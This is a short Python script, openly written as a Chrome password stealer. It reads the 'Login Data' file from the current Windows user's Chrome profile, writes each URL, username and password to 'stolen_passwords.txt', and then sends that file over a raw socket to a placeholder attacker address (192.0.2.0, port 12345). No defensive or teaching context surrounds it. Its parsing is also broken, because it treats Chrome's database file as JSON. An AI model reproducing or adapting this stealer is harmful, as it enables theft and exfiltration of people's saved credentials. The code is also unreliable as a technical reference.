import os
import json
import socket

au = os.getlogin()

# Function to steal Chrome passwords and write to a text file
def steal_chrome_passwords(chrome_profile_path):
    # Path to the Chrome password file
    password_file = os.path.join(chrome_profile_path, 'Login Data')
    
    # Read the password file
    with open(password_file, 'r') as file:
        password_data = file.read()
    
    # Parse the password data as JSON
    password_json = json.loads(password_data)
    
    # Extract the list of passwords
    passwords = password_json['logins']
    
    # Write passwords to a text file
    with open('stolen_passwords.txt', 'w') as outfile:
        for password in passwords:
            outfile.write(f"URL {password['url']} - Username {password['username']} - Password {password['password']}\n")
    
    return passwords

# Specify the Chrome profile path
chrome_profile = f'C:/Users/{au}/AppData/Local/Google/Chrome/User Data/Default'

# Call the function to steal Chrome passwords and write to file
stolen_passwords = steal_chrome_passwords(chrome_profile)

# Send the password file using netcat
nc_server = '192.0.2.0'  # Replace with the target IP
nc_port = 12345  # Replace with the target port
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((nc_server, nc_port))
    with open('stolen_passwords.txt', 'rb') as file:
        s.sendall(file.read())
